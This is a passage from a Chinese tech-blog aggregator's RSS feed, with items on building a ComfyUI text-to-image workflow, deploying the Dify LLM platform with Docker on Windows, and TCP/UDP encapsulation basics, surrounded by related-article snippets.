1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:41 +0000</pubDate>
    </item>
    <item>
      <title>ComfyUI绘画|文生图基础工作流搭建</title>
      <link>https://www.ppmy.cn/news/1540865.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维ComfyUI绘画|文生图基础工作流搭建news/2025/10/31 23:18:40/学好 AI绘画 不论是就业还是做副业赚钱都不错，但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料，给那些想学习 AI绘画 的小伙伴们一点帮助！设置中文界面方式一这份完整版的AI绘画全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】方式二节点删除界面中的方块卡片，都叫节点：只有将节点串联起来，才能形成一个工作流。按住「Ctrl」，框选所有节点，点击「Delete」删除所有节点：添加节点方法一空白处右键–新建节点任何模型想调用，都需要「加载器」；例如 大模型、LoRA、VAE、ControlNet，先新建一个「加载器」节点：方法二（推荐）双击空白处，再搜索节点（平时使用时，多记住节点的名称）：再来回顾下上一篇中，SD原理的工作流：现在已经有了一个可以选择大模型的「加载器」，接下来需要一个进行翻译工作的CLIP：跟 SD-WebUI 一样，ComfyUI 也需要有 正向/反向 提示词，我们可以复制粘贴再添加一个CLIP文本编码器：填写正反向提示词正向提示词：想让图片出现的元素反向提示词：不想让画面出现的元素；一般是多手多脚、质量差、色彩单一反向提示词；反向提示词的填写，一般建议使用一个embeddings即可，可以理解为多个关键词打包训练出来的一个小模型，包含了很多常见的负面关键词。正反向提示词颜色区分给节点卡片添加颜色：右键节点–颜色–选择颜色节点连接节点卡片上，颜色相同的两个点是可以相互连接的：节点卡片中左侧的连接处，叫做首部，右侧连接处，叫做尾部：两个节点，只能是尾部连接首部，尾部可以拉出来多条连接线，连接多个节点，而首部只能连接一个节点。采样器新建一个采样器节点：随机种子SD渲染时，需要用到随机噪声来生成不同的图片；在 ComfyUI 中，想让种子完全随机的话，需要设置为0。运行后操作这里有4个选项：固定：每次生成的图片的种子都是固定的增加：每次生图时种子数字+1减少：每次生图时种子数字-1随机：每次生图时完全随机的数字步数指的是每次生图时，降噪的次数，噪点去除越多，图片会越清晰，一般设置为20-40。CFG指的是关键词与图片的相关性，数值越高，关键词的相关性越高，建议设置为3-9：数值过低：美观度不足数值过高：画面出错采样器采样器的选项比较多，使用推荐：遇事不决就用 Euler adpmpp_2m_sde 最百搭调度器一般推荐使用 normal、karras：normal：线性均速降噪karras：曲线降噪，康开始降噪速度比较缓慢，中间突然加速，到快结束时又慢慢降低降噪可以理解为 WebUI 的重绘幅度，在做文生图时，这个值让它保持为1不要动，如果做图生图，值越高，生成的图片与原图越不相近，相反则越相近。正反向提示词连接模型连接压缩新建一个「空Latent」：空Latent 是用于输入图片尺寸：SD1.5 模型：建议尺寸范围512--768SD2.1 模型：建议尺寸范围768--1024SDXL 或者 SD3 模型：建议尺寸范围1024上下连接Latent解码新建一个 VAE解码器：连接Latent、VAE图像展示通过解码后，图片可以生成，但需要预览图像，因此需要一个生成框：这一步中，可以选择「保存图像」/「预览图像」：保存图像：页面可预览+自动保存到本地预览图像：页面可预览+支持手动保存（建议抽卡测试阶段使用）第一个工作流通过以上的操作，我们就完成了第一个工作流：出图点击右上方的「添加提示词对列」或者使用快捷键 「Ctrl」+「Enter」，等待片刻，即可完成出图：今天先分享到这里~这份完整版的AI绘画全套学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】http://www.ppmy.cn/news/1540865.html相关文章AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:40 +0000</pubDate>
    </item>
    <item>
      <title>AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台</title>
      <link>https://www.ppmy.cn/news/1540864.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台news/2025/10/31 23:18:39/AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台目录AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台一、简单介绍二、Docker 下载安装三、Dify 下载安装，及部署附录：一些报错问题处理一、启动容器报错 Get "https://registry-1.docker.io/v2/": net/http: request canceled二、docker compose up -d 的时候，docker-db-1 总是重启 Restarting，无法正常 Running一、简单介绍AGI，即通用人工智能（Artificial General Intelligence），是一种具备人类智能水平的人工智能系统。它不仅能够执行特定的任务，而且能够理解、学习和应用知识于广泛的问题解决中，具有较高的自主性和适应性。AGI的能力包括但不限于自我学习、自我改进、自我调整，并能在没有人为干预的情况下解决各种复杂问题。Dify是一个开源的大语言模型（LLM）应用开发平台，它旨在简化和加速生成式 AI 应用的创建和部署。这个平台结合了后端即服务（Backend as Service, BaaS）和 LLMOps 的理念，为开发者提供了一个用户友好的界面和一系列强大的工具，使他们能够快速搭建生产级的 AI 应用。Dify 的核心功能包括：低代码/无代码开发：通过可视化的方式允许开发者轻松定义 Prompt、上下文和插件等，无需深入底层技术细节。模块化设计：采用模块化的设计，每个模块都有清晰的功能和接口，可以根据需求选择性地使用。丰富的功能组件：包括 AI 工作流、RAG 管道、Agent、模型管理、可观测性功能等，帮助开发者从原型到生产的全过程。支持多种大语言模型：已支持 OpenAI GPT 系列等模型，并计划进一步扩展。数据处理和特征工程工具：提供了数据清洗、特征选择、特征变换等功能，帮助开发者更好地准备数据。集成外部知识源：允许自定义 API 接入外部知识源，让大型语言模型深入理解企业知识和业务。Dify 提供了四种基于 LLM 构建的应用程序，可以针对不同的应用场景和需求进行优化和定制，包括聊天助手、文本生成、智能代理和工作流程。此外，Dify 还支持从 Notion 导入数据，并设置同步，使得数据在 Notion 更新后便自动同步到 Dify。Dify 中存在知识库数据集的单独 API，这与他的服务 API 不同，可以单独使用数据集的 API。Dify 适合各种技术背景的开发者使用，即使是没有编程基础的用户也能快速上手并参与到 AI 应用的定义和数据运营过程中。作为一个开源项目，Dify 在 GitHub 上有活跃的社区支持，鼓励用户贡献和分享经验。Docker是一个开源的应用容器引擎，它允许开发者打包他们的应用以及应用的依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。Docker 的主要特点包括：轻量级：Docker 容器与其他虚拟化技术相比，占用的资源更少，启动速度更快。可移植性：Docker 容器可以在不同的机器、数据中心或云服务提供商之间轻松移动。环境一致性：Docker 确保应用在不同环境之间具有一致性，从而减少了“在我机器上可以运行”的问题。快速部署：Docker 容器的启动时间通常只需几秒钟，这使得部署应用变得更加迅速。微服务架构：Docker 容器非常适合微服务架构，每个服务可以独立运行在自己的容器中。版本控制和团队协作：Docker 容器可以与现代的 DevOps 工具链紧密结合，支持持续集成和持续部署（CI/CD）。隔离性：每个容器都是相互隔离的，运行在自己的环境中，拥有自己的文件系统。安全性：容器提供了一个额外的安全层，因为它们运行在用户空间，并且可以利用 Linux 内核的安全特性。Docker 使用客户端-服务器架构，使用 Docker 守护进程来管理容器。Docker 客户端与守护进程通信，而守护进程负责构建、运行和分发容器。用户可以通过命令行接口（CLI）、Docker Compose（用于定义和运行多容器 Docker 应用的工具）或图形用户界面（GUI）与 Docker 交互。注意 Dify Docker部署有部署要求，不过目前一般的电脑都符合要求：二、Docker 下载安装Docker Windows 版本下载地址：Windows | Docker Docs为了在 Windows 系统上部署 Dify，你需要先安装 Docker Desktop。Windows 中的 Docker 可以依赖于两种环境：Hyper-V（虚拟环境）和 WSL（Windows Linux 子系统）。其中，利用 WSL 环境的部署方案，这需要你从 Microsoft Store 下载一个 Linux 发行版。如果你的电脑无法使用 Microsoft Store 下载，比如生产环境电脑，那么可以选择使用基于 Hyper-V 的部署方法。启用 Hyper-V 环境的两种方法，下面介绍启用 Hyper-V 环境的方法，任选其一操作即可：1、以管理员权限打开 PowerShell 控制台2、输入如下命令即可Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All3、或者使用 “启用或关闭 Windows 功能”，找到并勾选“Hyper-V”，然后点击“确定”按钮以启用该功能4、开启 Hyper-V 功能，会提示重启电脑，这时候重启电脑即可5、下载 Docker ，根据需要选择下载即可6、下载好Docker ，双击安装即可值得注意的是如果使用 Hyper-V ，则需要取消勾选第一项三、Dify 下载安装，及部署Dify 官网：Dify.AI · 生成式 AI 应用创新引擎Dify 进行 Docker Compose 部署可以参考：https://docs.dify.ai/zh-hans/getting-started/install-self-hosted/docker-compose1、进入 Dify  官网，如图点击进入 Github ，克隆或者下载代码2、下载好后，Shift + 鼠标右键，打开 Powershell3、在 Powershell 中，进入 Dify 源代码的 Docker 目录 ，复制环境配置文件命:1：cd .\docker\命令2：cp .env.example .env4、这里就要启动 Docker，确定当前的 Docker  版本根据你系统上的 Docker Compose 版本，选择合适的命令来启动容器。你可以通过命令：docker compose version 检查版本如果版本是 Docker Compose V2，使用以下命令：docker compose up -d如果版本是 Docker Compose V1，使用以下命令：docker-compose up -d5、这里是 V2 版本，使用 docker compose up -d 命令来启动容器运行命令后，开始会拉取数据，然后会看到类似以下的输出，显示所有容器的状态和端口映射：6、运行完之后，输入 命令可以看到运行的服务命令：docker compose ps7、docker 界面也运行正常8、在浏览器上，输入 http://localhost/install ，这时候也会正常显示设置管理员账号界面输入信息，配置登录账号9、在浏览器上，输入 http://localhost/signin，这时候也会正常显示登陆界面，登陆即可10、登录之后，在工作室创建你的应用，开始玩转 Dify 吧附录：一些报错问题处理一、启动容器报错 Get "https://registry-1.docker.io/v2/": net/http: request canceledError response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)分析可能原因：1）这个是因为源的问题，我们可以使用国内的镜像源。具体操作为：找到C:\Users\Administrator.docker\daemon.json（或者C:\Users\你的用户名.docker\daemon.json）文件（如果.docker文件下没有daemon.json文件，就自己手动新增）2）然后添加以下内容：{"registry-mirrors": ["https://docker.211678.top","https://docker.1panel.live","https://hub.rat.dev","https://docker.m.daocloud.io","https://do.nark.eu.org","https://dockerpull.com","https://dockerproxy.cn","https://docker.awsl9527.cn"]
}3）保存后重启docker，重启操作为在打开docker Desktop的前提下，点击电脑右小角的小图标，点击“Restart ”，版本不同可能显示不同。二、docker compose up -d 的时候，docker-db-1 总是重启 Restarting，无法正常 Running此时 http://localhost/install 界面也一直在转圈，网页一直加载中docker-db-1 相关日志如下：running bootstrap script ... 2024-10-14T04:20:59.355405500Z The files belonging to this database system will be owned by user "postgres".
2024-10-14 12:20:59 This user must also own the server process.
2024-10-14 12:20:59 
2024-10-14 12:20:59 The database cluster will be initialized with locale "en_US.utf8".
2024-10-14 12:20:59 The default database encoding has accordingly been set to "UTF8".
2024-10-14 12:20:59 The default text search configuration will be set to "english".
2024-10-14 12:20:59 
2024-10-14 12:20:59 Data page checksums are disabled.
2024-10-14 12:20:59 
2024-10-14 12:20:59 fixing permissions on existing directory /var/lib/postgresql/data/pgdata ... ok
2024-10-14 12:19:58 2024-10-14 04:19:58.620 UTC [63] FATAL:  data directory "/var/lib/postgresql/data/pgdata" has invalid permissions
2024-10-14 12:19:58 2024-10-14 04:19:58.620 UTC [63] DETAIL:  Permissions should be u=rwx (0700) or u=rwx,g=rx (0750).
2024-10-14 12:19:58 child process exited with exit code 1
2024-10-14 12:19:58 initdb: removing contents of data directory "/var/lib/postgresql/data/pgdata"
2024-10-14 12:20:59 creating subdirectories ... ok
2024-10-14 12:20:59 selecting dynamic shared memory implementation ... posix
2024-10-14 12:20:59 selecting default max_connections ... 20
2024-10-14 12:21:00 selecting default shared_buffers ... 400kB
2024-10-14 12:21:00 selecting default time zone ... UTC
2024-10-14 12:21:00 creating configuration files ... ok
2024-10-14 12:21:00 2024-10-14 04:21:00.539 UTC [63] FATAL:  data directory "/var/lib/postgresql/data/pgdata" has invalid permissions
2024-10-14 12:21:00 2024-10-14 04:21:00.539 UTC [63] DETAIL:  Permissions should be u=rwx (0700) or u=rwx,g=rx (0750).
2024-10-14 12:21:00 child process exited with exit code 1
2024-10-14 12:21:00 initdb: removing contents of data directory "/var/lib/postgresql/data/pgdata"
2024-10-14 12:21:00 running bootstrap script ...解决方式之一如下1、在 dify/docker 文件夹下找到 docker-compose.yaml2、找到文件夹中的 volumes/db/data ，替换为 postgres-data，如下图（不同版本，内容可能有些不一样）3、最后在末尾，添加上 postgres-data4、保存上面修改，然后在 powershell down 一下 容器命令：docker compose down -v5、之后，再次重新启动一下容器命令：docker compose up6、docker-db-1 运行正常了http://www.ppmy.cn/news/1540864.html相关文章【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
1）事件定义      public static readonly RoutedEvent ClickEvent; 2）事件注册，Button按钮的Click事件是继承于ButtonBase基类的      ClickEvent = EventManager.RegisterRoutedEvent("Click", RoutingStrategy.Bubble, typeof(RoutedEven…阅读更多...鸿蒙网络编程系列7-TLS安全数据传输单向认证示例1.TLS简介 
TLS&amp;#xff08;Transport Layer Security&amp;#xff09;协议的前身是SSL&amp;#xff08;Secure Socket Layer&amp;#xff09;安全套接层协议&amp;#xff0c;由Netscape公司于1994年提出&amp;#xff0c;是一套网络通信安全协议。IETF&amp;#xff08;The Internet Engineering Task Fo…阅读更多...汕头市自闭症全托管学校，为孩子打开未来大门原文指路&amp;#xff1a;http://www.zibizhengwang.com/page33.html 
在探索自闭症儿童教育的广阔领域里&amp;#xff0c;全托管学校以其独特的优势&amp;#xff0c;为众多家庭提供了专业、全面且贴心的支持。汕头市自闭症全托管学校的成功实践&amp;#xff0c;无疑为我们提供了一个宝贵的参考…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:39 +0000</pubDate>
    </item>
    <item>
      <title>【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别</title>
      <link>https://www.ppmy.cn/news/1540863.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别news/2025/10/31 23:18:38/前言🌟🌟本期讲解关于TCP/UDP协议的原理理解~~~🌈上期博客在这里：【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客🌈感兴趣的小伙伴看一看小编主页：GGBondlctrl-CSDN博客🔥 你的点赞就是小编不断更新的最大动力🎆那么废话不多说直接开整吧~~~目录一.封装与分用1.封装1.1应用层封装1.2传输层封装1.3网络层封装1.4数据链路层封装1.5物理层发送2.分用2.1物理层分用2.2数据链路层分用2.3网络层分用2.4传输层分用2.5应用层显示3.路由器与交换机分用3.1交换机的分用3.2路由器的分用二.网络编程重要概念1.客户端与服务器1.1客户端与服务器的理解1.1客户端与服务器之间的交互2.TCP与UDP的区别三.总结一.封装与分用1.封装所谓的封装是数据传输中一个重要的过程，即添加报头的过程就是封装，但是这里显得很是抽闲，那么就按照一下来进行解释吧；假如我们要进行一次聊天，我们就会发送一个“你好吗朋友？”，那么此时每一层的操作是怎样的呢？？？1.1应用层封装这里在应用层就会把这个字符串构造成一个应用层数据包，这里的数据包就是按照应用层的协议进行构造的，我们假如这里的数据包是按照应用层协议进行构造如图所示：实现数据包的传输：这里就是通过传输层提供的API，进行调用过后，将应用层数据包传给传输层；1.2传输层封装那么这里的传输层就会将上述的数据作为一个整体，然后将这个整体封装成为传输层数据包，由于传输层使用的协议是TCP或者是UDP那么这里就会将这的传输层数据包成为TCP数据包，即添加TCP的报头如图所示：此时就将这里的应用层数据包进行了封装，其中TCP部分为报头，后面部分为“载荷”，并且这里的TCP报头承载这关键的传输信息；实现TCP数据包的转送：这里就是通过调用网络层提供的API，进行调用过后，将TCP数据包传给网络层；1.3网络层封装这里就会将从传输层传输过来的数据又当做是一个整体，然后将这个整体封装成网络层数据包，由于这里的协议是IP协议，那么就会在这个整体之上又拼上一个IP报头；图示如下：此时黄色部分就是IP数据包的报头，红色和和黑色部分即是IP数据包的载荷；并且这里的IP报头承载了重要的源IP和目的IP；实现IP数据包的转送：这里就是通过调用数据链路层提供的API，进行调用过后，将IP数据包传给数据链路层；1.4数据链路层封装此时这里的封装和上述是一样的，这里使用的协议是“以太网”，那么就会将上述的IP数据包进行封装成为以太网数据帧；如图所示：那么此时整个就是一个以太网数据帧，一个帧头，一个帧尾，然后中间部分就是以太网数据帧的载荷；实现以太网数据帧的转送：这里就是通过调用数据链路层提供的API，进行调用过后，传到物理层1.5物理层发送这里就要将从数据链路层中的以太网数据帧的二进制数据转化成以光纤、电磁破、电信号的方式进行传播出去；2.分用2.1物理层分用此时当接收方的物理层受到后，将其转化为二进制的以太网数据帧，传给数据链路层2.2数据链路层分用就是按照以太网数据帧的方式进行解析，取出以太网数据帧的载荷部分，传给上层的协议；2.3网络层分用就是按照IP协议的格式进行解析，将IP数据包的载荷取出来传给上层协议；2.4传输层分用就是按照TCP协议进行解析，取出TCP数据包的载荷部分，然后将这部分传给上层协议；2.5应用层显示最后使用应用层协议，解析数据，将其中的内容信息解析出来，然后显示在另一方的手机上注意：分用就是封装的逆向过程3.路由器与交换机分用接着上满的讲述，这里用于网络直通的情况下完成的工作，但是现实情况不是，在这之间，存在很多的路由器和交换机的连接，所以真正的情况并不是一直分用到五层；3.1交换机的分用经典的交换机，分用到数据链路层；实际上的过程就是，交换机物理层将光电信号等转化为二进制的以太网数据帧，传给交换机数据链路层；然后就会解析以太网数据帧，取出载荷，另一方面解析帧头帧尾决定下一步数据往哪里进行发送；如图所示：此时解析完后进行新的以太网数据帧的插入：此时就完成的交换机的分用过程了~~~3.2路由器的分用这里的路由器分用比交换机分用要复杂一点，这里是分用到网络层；具体过程如下：1.首先在路由器的物理层上将物理信号转化为二进制的以太网数据帧，然后传送给数据链路层；如下图所示：2.然后将这的数据链路层进行解析，拿出载荷，传给网络层；3.在网络层，IP协议就会对这个IP数据包进行解析，取出载荷，拿到数据后进行新的IP报头的封装，即如下：4.然后继续传给是数据链路层， 继续新的以太网数据帧的封装：封装完成后，传输给下一层的物理层，进行物理信号的转化，传输给下一个组件；二.网络编程重要概念1.客户端与服务器1.1客户端与服务器的理解概念：在网络中主动发起信息的是客户端，被动接收信息的一端是服务器；同一个程序在不同的场景中扮演的客户端还是服务器是不确定的；如下图：例如此时：这里的的入口服务器在绿色方框内，就代表的是服务器，但是在黄色方框内就是发起请求的一方，那么他就是客户端客户端给服务器发送数据就是“请求”服务器给客户端返回数据就是“响应”1.1客户端与服务器之间的交互1.一问一答即一个请求对应的是一个响应，后序的网站开发就是如此；2.一问多答即一个请求对应的是多个响应，即这里的场景多为“下载”；3.多问一答即多个请求对应的是一个响应，这里的使用场景多为“上传”；4.多问多答即多个请求对应的是多个响应，这里使用的场景一般就是“远程桌面、远程控制”2.TCP与UDP的区别TCP：有连接，可靠传输，面向字节流，全双工UDP：无连接，不可靠传输，面向数据报，全双工1.有连接&amp;无连接这里的连接不是物理意义上的连接，而是虚拟的连接，有连接就是像打电话一样，双发接通才能通话消息；而无连接就是发短信，微信一样，只要发送了无论对方是否同意，那么都能受到消息2.可靠传输&amp;不可靠传输这里的可靠传输是尽可能完成数据传输，虽然无法确保能否传输给对方，但是知道这个数据对方是否收到了，而不可靠传输，就并不知道数据是否对方收到了3.面向字节流&amp;面相数据报和文件IO一致，面向字节流表示的是以字节来进行传输，而面向数据报，表示的是按照数据报的方式进行传输（数据报是由一系列字节组成的特定结构）4.全双工&amp;半双工一个通道可以双向通信就是全双工，如只能一方进行通信就是半双工；三.总结💬💬本期小编注重讲解了关于TCP/UDP协议的内部实现数据的传输转化的原理，包括如何进行封装，如何进行分用，以及存在路由器和交换机的情况；最后在网络编程小编提出了客户端与服务器的概念，以及TCP与UDP的区别~~~🌅🌅🌅~~~~最后希望与诸君共勉，共同进步！！💪💪💪以上就是本期内容了， 感兴趣的话，就关注小编吧。😊😊  期待你的关注~~~http://www.ppmy.cn/news/1540863.html相关文章危化品经营单位（生产管理人员）考试试题及答案危化品经营单位&amp;#xff08;生产管理人员&amp;#xff09;考试试题及答案 
76.生产经营单位应当组织开展本单位的&amp;#xff08; &amp;#xff09;,使有关人员了解应急预案内容,熟悉应急职责、应急程序和岗位应急处置方案。 
A.应急预案培训活动 
B.应急预案编制 
C.应急预案演练 
答案:A…阅读更多...六、LogicFlow 自定义业务边 Edge前言 
经过前面的文章讲解&amp;#xff0c;目前已经实现了节点拖拽到画布中&amp;#xff0c;并且也实现了节点之间的基础连线&amp;#xff0c;到这里也算是入了门&amp;#xff0c;接下来继续探究新学习新的功能&amp;#xff0c;以满足新的需求&amp;#xff0c;那么这一章就会学习如何更改两节点之间的连…阅读更多...Verilator——最简单、最细节上手教程目录 前言工具安装Verilator 安装GTKwave 安装 Verilator 基础用法fst格式和vcd格式的wave文件Verilator 的使用 Verilator 的进阶使用与GDB搭配与makefile搭配 Verilator 的高阶用法访问模块内部数据 前言 
此教程会以ubuntu22.04为例 从如何安装&amp;#xff0c;到如何使用 全程帮…阅读更多...oracle中的exists 和not exists 用法exists &amp;#xff08;sql 返回结果集为真&amp;#xff09; not exists (sql 不返回结果集为真&amp;#xff09; exists 与 in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in not exists 与 not in 意思相同&amp;#xff0c;语法不同&amp;#xff0c;效率高于in 
基本概念&amp;#xff1a; 
se…阅读更多...WPF入门_03路由事件１、如何定义路由事件 
